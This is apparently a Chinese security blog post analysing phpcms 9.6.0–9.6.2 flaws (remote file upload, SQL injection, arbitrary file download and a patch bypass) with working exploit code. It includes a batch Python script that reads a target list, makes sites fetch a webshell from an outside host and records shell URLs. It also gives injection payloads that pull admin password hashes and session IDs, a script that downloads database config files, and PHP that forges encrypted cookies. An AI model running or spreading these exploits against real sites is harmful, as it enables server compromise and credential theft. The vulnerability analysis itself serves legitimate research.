### 前言
粗浅的分析下phpcms的几个版本的漏洞，附上exp。

### phpcms9.6.0

#### upload

漏洞分析就看这个吧，大佬分析的真的是全面。

[https://www.hackersb.cn/hacker/219.html](https://www.hackersb.cn/hacker/219.html)

这个漏洞产生原因主要是对download函数的过滤不严，在对远程连接地址的过滤可绕过，在9.6.1中已经修复。

##### EXP_upload
网上公布的大部分脚本都是根据页面回显提取shell地址，但是我本地测试的时候并没有爆mysql的错误把地址回显出来，所以只能尝试爆破。
	#!/usr/bin/env python
	# coding: utf-8
	#Authon:phyb0x
	#phpcms9.6.0 upload

	import requests
	import time 
	import re

	result = []
	def savewebshell(file,list):
		s = '\n'.join(list)
		with open(file,'a') as output:
			output.write(s)

	def poc():
		fp = open("url.txt","r")
		alllines = fp.readlines()
		fp.close()
		for eachline in alllines:
			eachline = eachline.strip()
			host = eachline
			try:
				url ="{}index.php?m=member&c=index&a=register&siteid=1".format(host)
				shell = ''
				data = {
					'siteid':'1',
					'modelid':'11',
					'username':'t3esht123',
					'password':'t3esht123',
					'email':'tdehst@qq.com',
					'info[content]':'<img src=http://www.blogsir.com.cn/lj_ctf/shell.txt?.php#.jpg>',
					'dosubmit':'1'}
	
				nowtime = time.strftime('%Y%m%d%I%M%S')
				nowtime = nowtime[:13]
				req = requests.post(url=url,data=data)
				path = 'uploadfile/' + time.strftime("%Y") +'/'+ time.strftime("%m%d") + '/'
				for i in range(0000,9999):
					filename = nowtime + str(i) +'.php'
					shell = host + path + filename
					req = requests.get(url=shell)
					if req.status_code == 200:
						global result
						result.append(shell)
						print('shell:',shell)
						break
					else:
						print('NO BUG')
						break
			except Exception as a:
				print('Request Bad')			

	if __name__ == '__main__':
		poc()
		savewebshell('webshell.txt',result)
可以结合我github上的zoomeye_api配合使用，不过好像不太好用.....


#### sqli

漏洞的出发点在phpcms\modules\content\down.php

	public function init() {
		$a_k = trim($_GET['a_k']); //get获取变量
		if(!isset($a_k)) showmessage(L('illegal_parameters'));
		$a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system','auth_key'));//对参数进行解密
		if(empty($a_k)) showmessage(L('illegal_parameters'));
		unset($i,$m,$f);
		parse_str($a_k);//将字符串解析到变量
		if(isset($i)) $i = $id = intval($i);
		if(!isset($m)) showmessage(L('illegal_parameters'));
		if(!isset($modelid)||!isset($catid)) showmessage(L('illegal_parameters'));
		if(empty($f)) showmessage(L('url_invalid'));
		$allow_visitor = 1;
		$MODEL = getcache('model','commons');
		$tablename = $this->db->table_name = $this->db->db_tablepre.$MODEL[$modelid]['tablename'];
		$this->db->table_name = $tablename.'_data';
  	***	$rs = $this->db->get_one(array('id'=>$id));	//进行sql查询
		$siteids = getcache('category_content','commons');
		$siteid = $siteids[$catid];
		$CATEGORYS = getcache('category_content_'.$siteid,'commons');

		$this->category = $CATEGORYS[$catid];
		$this->category_setting = string2array($this->category['setting']);
		——————省略——————
整个流程就是先获取参数然后调用sys_auth进行'DECODE'解密，parse_str()解析变量最后也是最重要的get_one把id参数代入sql。

这里漏洞产生还有一个原因，看大佬分析这里parse_str()会解析url编码，所以代入sql的payload才会被执行。不过我觉得这里只能算是php的一个特性吧，算是函数使用不当，毕竟没有进行任何操作解密后就直接把参数代入查询怎么看也是最大的锅！

phpcms\libs\classes\acccess.class.php 第50行


	function get_one($query) {
		$this->querynum++;
	    $rs = $this->conn->Execute($query);
 		$r = $this->fetch_array($rs);
		$this->free_result($rs);
		return $r;
	}
到现在很明确，我们要把payload加密整合到$a_k中的id参数才能利用。
而且秘钥我们并没有,要利用目标phpcms站点进行在线加密把加密后的payload回显出来，还有几个前置条件:

    $i为空
    $m不为空
    $modelid 且 $catid 不为空
    $f不为空


phpcms\modules\attachment\attachments.php 第239行

		public function swfupload_json() {
		$arr['aid'] = intval($_GET['aid']);
		$arr['src'] = safe_replace(trim($_GET['src']));
		$arr['filename'] = urlencode(safe_replace($_GET['filename']));
		$json_str = json_encode($arr);
		$att_arr_exist = param::get_cookie('att_json');
		$att_arr_exist_tmp = explode('||', $att_arr_exist);
		if(is_array($att_arr_exist_tmp) && in_array($json_str, $att_arr_exist_tmp)) {
			return true;
		} else {
			$json_str = $att_arr_exist ? $att_arr_exist.'||'.$json_str : $json_str;
			param::set_cookie('att_json',$json_str);
			return true;			
		}
	}
这里主要涉及三个函数，safe_replace、get_cookie、set_cookie

phpcms\libs\param.class.php 86行

	public static function set_cookie($var, $value = '', $time = 0) {
		$time = $time > 0 ? $time : ($value == '' ? SYS_TIME - 3600 : 0);
		$s = $_SERVER['SERVER_PORT'] == '443' ? 1 : 0;
		$var = pc_base::load_config('system','cookie_pre').$var;
		$_COOKIE[$var] = $value;
		if (is_array($value)) {
			foreach($value as $k=>$v) {
				setcookie($var.'['.$k.']', sys_auth($v, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s);
			}
		} else {
			setcookie($var, sys_auth($value, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s);
		}
	}
这里可以看到set_cookie调用了sys_auth加密函数，同理get_cookie调用解密。在函数中我们可以看到att_json作为键值 json_str(aid、src、filename)作为值传入cookie中加密，而且src参数只进行safe_replace，也就是说我们可以把payload传入src参数到set_cookie中去加密。

	function safe_replace($string) {
    $string = str_replace('%20','',$string);
    $string = str_replace('%27','',$string);
    $string = str_replace('%2527','',$string);
    $string = str_replace('*','',$string);
    $string = str_replace('"','"',$string);
    $string = str_replace("'",'',$string);
    $string = str_replace('"','',$string);
    $string = str_replace(';','',$string);
    $string = str_replace('<','<',$string);
    $string = str_replace('>','>',$string);
    $string = str_replace("{",'',$string);
    $string = str_replace('}','',$string);
    $string = str_replace('\\','',$string);
    return $string;
	}

不多说很好进行绕过了吧。不过如果我们直接访问访问不到swfupload_json()，这里有一个构造函数如果cookie的_userid或者表单userid_flash的值为空会跳转到主页。所以我们要先获取cookie

        
        $this->db = pc_base::load_model('content_model');
        $this->siteid = isset($_GET['siteid']) && (intval($_GET['siteid']) > 0) ? intval(trim($_GET['siteid'])) : (param::get_cookie('siteid') ? param::get_cookie('siteid') : 1);
        param::set_cookie('siteid',$this->siteid);    
        $this->wap_site = getcache('wap_site','wap');
        $this->types = getcache('wap_type','wap');
        $this->wap = $this->wap_site[$this->siteid];
        define('WAP_SITEURL', $this->wap['domain'] ? $this->wap['domain'].'index.php?' : APP_PATH.'index.php?m=wap&siteid='.$this->siteid);
        if($this->wap['status']!=1) exit(L('wap_close_status'));
可以看到set_cookie函数把value代入cookie满足条件。

##### 漏洞利用

第一步：访问index.php?m=wap 获取userid_flash的值(wap模块开不开启都能获取)

![](https://i.imgur.com/Syrn7AV.png)

第二步:

![](https://i.imgur.com/WePRdNn.png)

可以看到利用swfupload_json把src=%26id%3d%2*7and%20updatexml(1,concat(1,(user())),1)%23%26m%3d1%26modelid%3d1%26catid%3d1%26f%3d1 进行加密处理并回显出来。

第三步:

![](https://i.imgur.com/U8c7xoO.png)

用GET方法提交赋予加密payload的$a_k，注入成功。

##### EXP

	import requests
	import urllib
	import re

	def poc(url):
		step1 = '{}/index.php?m=wap&a=index&siteid=1'.format(url)
		req = requests.get(url=step1)
		for i in req.cookies:
			if i.name[-7:] == '_siteid':
				userid_flash = i.value
			else:
				print('Step1 is error')

		#payload ='&id=%*27 and updatexml(1,concat(1,(select concat(username,0x3a,encrypt) from v9_admin)),1)%23&modelid=1&catid=1&m=1&f='
		#payload="&id=%*27 and updatexml(1,concat(1,(select concat(0x3a,password,0x3a) from v9_admin)),1)%23&modelid=1&catid=1&m=1&f="
		#payload="&id=%*27 and updatexml(1,concat(1,(select concat(0x706f6374657374,username,0x23,password,0x3a,encrypt,0x706f6374657374) from v9_admin)),1)%23&modelid=1&catid=1&m=1&f="
		#payload ='&id=%*27 and updatexml(1,concat(1,(select concat(sessionid) from v9_session)),1)%23&modelid=1&catid=1&m=1&f='
	
		payload =urllib.parse.quote(payload)
		step2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src={}".format(url,payload)
		data = {'userid_flash':userid_flash}
		req2 = requests.post(url=step2,data=data)
		for i in req2.cookies:
			if i.name[-9:] == '_att_json':
				a_k = i.value
		if a_k == '':
			print('sys_paylaod Bad')

		step3 = "{}/index.php?m=content&c=down&a_k={}".format(url,a_k)
		req3 = requests.get(url=step3)
		if 'MySQL Error' in req3.text:
			result = re.findall(r"MySQL Error : </b>XPATH syntax error: '(.*?)' <br /> <b>MySQL Errno",req3.text)
			print(result)

	if __name__ == '__main__':
		poc('http://localhost/phpcms9.6.0/')

这个出的密码加盐的，要解密，据说可以直接获取session但是我简单试 一下没成。


### phpcms9.6.1

这个版本公布的只有一个漏洞，任意文件读取。

#### 9.6.1 任意文件下载

我们先看看绿盟给的payload

	http://10.65.20.198/phpcms_v9.6.1_UTF8/index.php?m=content&c=down&a=download&a_k=050a8GfSF2bwK4H-oJhtDI2f9ixgu_iRvkGN1VX3I3X0wD-s-LPJnRGnM_xikA_rYLQInxgtkGtwL-JRW1HGHFO87kxWoVihALeRKJZEfTCcEYYrAOl_uqqzs7imN1QtTktE8jpF3zxIKeUOc0dFw7xr2JHyrWy8-lrUAQ

调用了down 模块 、 download方法，后面a_k是加密函数之前分析过。

先分析/phpcms/modules/content/down.php download方法(87-130)。

	public function download() {
		$a_k = trim($_GET['a_k']);//传入a_k
		$pc_auth_key = md5(pc_base::load_config('system','auth_key').$_SERVER['HTTP_USER_AGENT'].'down');
		$a_k = sys_auth($a_k, 'DECODE', $pc_auth_key);//解密
		if(empty($a_k)) showmessage(L('illegal_parameters'));
		unset($i,$m,$f,$t,$ip);
		$a_k = safe_replace($a_k);//对a_k进行函数过滤
		parse_str($a_k); //解析变量		
		if(isset($i)) $downid = intval($i);
		if(!isset($m)) showmessage(L('illegal_parameters'));
		if(!isset($modelid)) showmessage(L('illegal_parameters'));
		if(empty($f)) showmessage(L('url_invalid'));
		if(!$i || $m<0) showmessage(L('illegal_parameters'));
		if(!isset($t)) showmessage(L('illegal_parameters'));
		if(!isset($ip)) showmessage(L('illegal_parameters'));
		$starttime = intval($t);
		if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i',$f) || strpos($f, ":\\")!==FALSE || strpos($f,'..')!==FALSE) showmessage(L('url_error'));//对$f参数进行正则用其中之一就返回错误
		$fileurl = trim($f);//赋值
		if(!$downid || empty($fileurl) || !preg_match("/[0-9]{10}/", $starttime) || !preg_match("/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/", $ip) || $ip != ip()) showmessage(L('illegal_parameters'));//进行过滤有其中之一就返回参数错误	
		$endtime = SYS_TIME - $starttime;
		if($endtime > 3600) showmessage(L('url_invalid'));
		if($m) $fileurl = trim($s).trim($fileurl);//赋值
		if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i',$fileurl) ) showmessage(L('url_error'));//再次进行后缀名过滤
		//远程文件
		if(strpos($fileurl, ':/') && (strpos($fileurl, pc_base::load_config('system','upload_url')) === false)) { 
			header("Location: $fileurl");
		} else {
			if($d == 0) {
				header("Location: ".$fileurl);
			} else {
				$fileurl = str_replace(array(pc_base::load_config('system','upload_url'),'/'), array(pc_base::load_config('system','upload_path'),DIRECTORY_SEPARATOR), $fileurl);
				$filename = basename($fileurl);
				//处理中文文件
				if(preg_match("/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/", $fileurl)) {
					$filename = str_replace(array("%5C", "%2F", "%3A"), array("\\", "/", ":"), urlencode($fileurl));
					$filename = urldecode(basename($filename));
				}
				$ext = fileext($filename);
				$filename = date('Ymd_his').random(3).'.'.$ext;
				$fileurl = str_replace(array('<','>'), '',$fileurl);
				file_down($fileurl, $filename);
			}
		}
	}



从上往下分析，首先获取$a_k并进行解密，然后对内容进行safe_replace()过滤。

	function safe_replace($string) {
		$string = str_replace('%20','',$string);
		$string = str_replace('%27','',$string);
		$string = str_replace('%2527','',$string);
		$string = str_replace('*','',$string);
		$string = str_replace('"','"',$string);
		$string = str_replace("'",'',$string);
		$string = str_replace('"','',$string);
		$string = str_replace(';','',$string);
		$string = str_replace('<','<',$string);
		$string = str_replace('>','>',$string);
		$string = str_replace("{",'',$string);
		$string = str_replace('}','',$string);
		$string = str_replace('\\','',$string);
		return $string;
	}
然后用parse_str()解析变量然后去判断一些参数不为空，并且对$f再次进行过滤

	if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i',$f) || strpos($f, ":\\")!==FALSE || strpos($f,'..')!==FALSE) showmessage(L('url_error')); 
很清楚了有其中一只都会返回错误。然后$f赋值给了$fileurl。

	if(!$downid || empty($fileurl) || !preg_match("/[0-9]{10}/", $starttime) || !preg_match("/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/", $ip) || $ip != ip()) showmessage(L('illegal_parameters'));	
	···
	if($m) $fileurl = trim($s).trim($fileurl);

进行简单判断之后再次进行了赋值操作，而这两个参数都是$a_k解析而来，$s可控$f进行了一些过滤操作。下面又对$fileurl过滤

	if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i',$fileurl) ) showmessage(L('url_error'));
后面又进行了if循环,而我们的目标就是进入最后一次循环中调用file_down()去下载任意文件。

	function file_down($filepath, $filename = '') {
		if(!$filename) $filename = basename($filepath);
		if(is_ie()) $filename = rawurlencode($filename);
		$filetype = fileext($filename);
		$filesize = sprintf("%u", filesize($filepath));
		if(ob_get_length() !== false) @ob_end_clean();
		header('Pragma: public');
		header('Last-Modified: '.gmdate('D, d M Y H:i:s') . ' GMT');
		header('Cache-Control: no-store, no-cache, must-revalidate');
		header('Cache-Control: pre-check=0, post-check=0, max-age=0');
		header('Content-Transfer-Encoding: binary');
		header('Content-Encoding: none');
		header('Content-type: '.$filetype);
		header('Content-Disposition: attachment; filename="'.$filename.'"');
		header('Content-length: '.$filesize);
		readfile($filepath);
		exit;
	}
其实就是个普通的下载函数，不普通在调用他的时候参数我们是可控的。

			if(preg_match("/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/", $fileurl)) {
				$filename = str_replace(array("%5C", "%2F", "%3A"), array("\\", "/", ":"), urlencode($fileurl));
				$filename = urldecode(basename($filename));
			}
			$ext = fileext($filename);
			$filename = date('Ymd_his').random(3).'.'.$ext;
			$fileurl = str_replace(array('<','>'), '',$fileurl);
			file_down($fileurl, $filename);

关键点就在这，进过上面的层层过滤无论是单独的$s $f还是合在一起的$fileurl都不可能有什么危险后缀，但是这里对$fileurl进行了正则替换把<>换成空 ......也就是说我们可以这样进行拼接

	$s=test.ph + $f=>p = $fileurl=test.ph>p = test.php

接下来的问题就是怎么把自己带有payload的加密并且回显出来。老生常谈了用wap这里就不说了。

#### 漏洞利用
以数据库文件为例，生成下载链接访问下载就行。

	import requests

	def poc(host):
		step = '{}index.php?m=wap&a=index&siteid=1'.format(host)
		req = requests.get(url=step)
		for i in req.cookies:
			if i.name[-7:] == '_siteid':
				userid_flash = i.value
			else:
				print('Step1 is error')
		step1 = '{}index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dcaches/configs/database%26f%3D.p%25253chp'.format(host)

		data = {'userid_flash':userid_flash}
		req1 = requests.post(url=step1,data=data)

		for i in req1.cookies:
			if i.name[-9:] == '_att_json':
				a_k = i.value
		if a_k == '':
			print('sys_paylaod Bad')

		url = '{}index.php?m=content&c=down&a_k={}'.format(host,a_k)
		print(url)

	if __name__ == '__main__':
		poc('http://127.0.0.1/phpcmsv9.6.1/')

### phpcms9.6.2

#### 任意文件读取

这个属于补丁绕过，可以看到补丁又加了一次正则但是有被绕过的可能。
![](https://i.imgur.com/ly7Kc2H.png)

trim函数也不是安全的，%81-%99间的字符是不会被trim去掉的且在windows中还能正常访问到相应的文件。给出payload

	http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=attachment&c=attachments&a=swfupload_json&src=a%26i=1%26m=1%26catid=1%26f=./caches/configs/system.ph%*25*3ep%2581%26modelid=1%26d=1&aid=1

#### sqli

在member模块，会员前台管理中心接口的继承父类foreground:

	class index extends foreground {

	private $times_db;
	
	function __construct() {
		parent::__construct();
		$this->http_user_agent = $_SERVER['HTTP_USER_AGENT'];
	}
跟进foreground /phpcms/modules/member/classes/foreground.class.php 19-33


	public $db, $memberinfo;
	private $_member_modelinfo;
	
	public function __construct() {
		self::check_ip();
		$this->db = pc_base::load_model('member_model');
		//ajax验证信息不需要登录
		if(substr(ROUTE_A, 0, 7) != 'public_') {
			self::check_member();
		}
	}
	
	/**
	 * 判断用户是否已经登陆
	 */
	final public function check_member() {
		$phpcms_auth = param::get_cookie('auth');
		if(ROUTE_M =='member' && ROUTE_C =='index' && in_array(ROUTE_A, array('login', 'register', 'mini','send_newmail'))) {
			if ($phpcms_auth && ROUTE_A != 'mini') {
				showmessage(L('login_success', '', 'member'), 'index.php?m=member&c=index');
			} else {
				return true;
			}
		} else {
			//判断是否存在auth cookie
			if ($phpcms_auth) {
				$auth_key = $auth_key = get_auth_key('login');
				list($userid, $password) = explode("\t", sys_auth($phpcms_auth, 'DECODE', $auth_key));
				//验证用户，获取用户信息
				$this->memberinfo = $this->db->get_one(array('userid'=>$userid));

可以看到只要不是ajax就需要进入check_member()函数，而函数第一个if的else循环里可以看到进行解密操作并且把userid用get_one()拼接代入数据库,这就造成了注入。

userid的值是cookie解密而来，那我们看下cookie操作，

	public static function get_cookie($var, $default = '') 	{
		$var = pc_base::load_config('system','cookie_pre').$var;
		$value = isset($_COOKIE[$var]) ? sys_auth($_COOKIE[$var], 'DECODE') : $default;
		if(in_array($var,array('_userid','userid','siteid','_groupid','_roleid'))) {
		$value = intval($value);
		} elseif(in_array($var,array('_username','username','_nickname','admin_username','sys_lang'))) { //  site_model auth
		$value = safe_replace($value);
		}
		return $value;
	}

先读取了cookie_pre，然后对cookie_pre_auth进行解密，没传入key说明是默认的用配置文件中的auth_key作为解密密钥。然后走到这里进行第二次解密

	if ($phpcms_auth) { $auth_key = $auth_key = get_auth_key('login'); list($userid, $password) = explode("\t", sys_auth($phpcms_auth, 'DECODE', $auth_key));

秘钥为auth_key= get_auth_key('login') 跟进

	function get_auth_key($prefix,$suffix="") {
		if($prefix=='login'){
			$pc_auth_key = md5(pc_base::load_config('system','auth_key').ip());
		}else if($prefix=='email'){
			$pc_auth_key = md5(pc_base::load_config('system','auth_key'));
		}else{
			$pc_auth_key = md5(pc_base::load_config('system','auth_key').$suffix);
		}
		$authkey = md5($prefix.$pc_auth_key);
		return $authkey;
	}

传入login进入

	$pc_auth_key = md5(pc_base::load_config('system','auth_key').ip());

auth_key是默认秘钥与IP拼接成的。而ip()可以伪造

	function ip() {
		if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
			$ip = getenv('HTTP_CLIENT_IP');
		} elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
			$ip = getenv('HTTP_X_FORWARDED_FOR');
		} elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
			$ip = getenv('REMOTE_ADDR');
		} elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
			$ip = $_SERVER['REMOTE_ADDR'];
		}
		return preg_match ( '/[\d\.]{7,15}/', $ip, $matches ) ? $matches [0] : '';
	}

所以说参数全可控。而默认秘钥我们可以配合任意下载来获取。

思路很清晰了要倒着来：

$userid = paylaod ->  sys_auth($phpcms_auth, 'DECODE', $auth_key) -> sys_auth($_COOKIE[$var], 'DECODE') ->  加密后的sql payload


#### 漏洞利用
附上某位大佬的poc:


	<?php
	/**
	* 字符串加密、解密函数
	*
	*
	* @param    string    $txt        字符串
	* @param    string    $operation    ENCODE为加密，DECODE为解密，可选参数，默认为ENCODE，
	* @param    string    $key        密钥：数字、字母、下划线
	* @param    string    $expiry        过期时间
	* @return    string
	*/
	function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
    	$ckey_length = 4;
   		$key = md5($key != '' ? $key : "4sUeVkLdmNZYGu2bPshg");
    	$keya = md5(substr($key, 0, 16));
    	$keyb = md5(substr($key, 16, 16));
    	$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

    	$cryptkey = $keya.md5($keya.$keyc);
    	$key_length = strlen($cryptkey);

    	$string = $operation == 'DECODE' ? base64_decode(strtr(substr($string, $ckey_length), '-_', '+/')) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
    	$string_length = strlen($string);

    	$result = '';
    	$box = range(0, 255);

    	$rndkey = array();
    	for($i = 0; $i <= 255; $i++) {
        	$rndkey[$i] = ord($cryptkey[$i % $key_length]);
    	}

   		for($j = $i = 0; $i < 256; $i++) {
        	$j = ($j + $box[$i] + $rndkey[$i]) % 256;
        	$tmp = $box[$i];
       		$box[$i] = $box[$j];
        	$box[$j] = $tmp;
    	}

    	for($a = $j = $i = 0; $i < $string_length; $i++) {
        	$a = ($a + 1) % 256;
        	$j = ($j + $box[$a]) % 256;
        	$tmp = $box[$a];
        	$box[$a] = $box[$j];
        	$box[$j] = $tmp;
        	$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    	}

    	if($operation == 'DECODE') {
        	if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
            return substr($result, 26);
        	} else {
        	    return '';
        	}
    	} else {
        	return $keyc.rtrim(strtr(base64_encode($result), '+/', '-_'), '=');
    	}
	}

	$auth_key = "wR67aGYF4kOghES5NKG1";
	$ip = "123.59.214.3";
	function get_auth_key($prefix,$suffix="") {
    	global $auth_key;
   		global $ip;
    	if($prefix=='login'){
        	$pc_auth_key = md5($auth_key.$ip);
    	}else if($prefix=='email'){
        	$pc_auth_key = md5($auth_key);
    	}else{
        	$pc_auth_key = md5($auth_key.$suffix);
    	}
    	$authkey = md5($prefix.$pc_auth_key);
    	return $authkey;
	}

	$auth_key2 = get_auth_key('login');
	$auth_key2 = get_auth_key('login');
	$sql = "1' and (extractvalue(1,concat(0x7e,(select user()))));#\txx";
	#$sql = "1' and (extractvalue(1,concat(0x7e,(select sessionid from v9_session))));#\tokee";
	$sql = sys_auth($sql,'ENCODE',$auth_key2);
	echo sys_auth($sql,'ENCODE',$auth_key);

	echo "\n";
	echo sys_auth('1','ENCODE',$auth_key);

	echo sys_auth('3d1bj3Vdx7JEQ6XakmlhBiUiEYBo7Ff3XMV2qrSu','DECODE',$auth_key);


参考链接：

http://blog.nsfocus.net/phpcms-v9-6-1-arbitrary-file-download-vulnerability-analysis-exp/

https://www.jianshu.com/p/47bf5b7c3b2e

https://www.anquanke.com/post/id/86134

https://www.jianshu.com/p/67c81e3b3258


https://xz.aliyun.com/t/201

https://www.waitalone.cn/phpcmsv96-sql-getshell.html

https://www.kingkk.com/2018/07/phpcms-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1

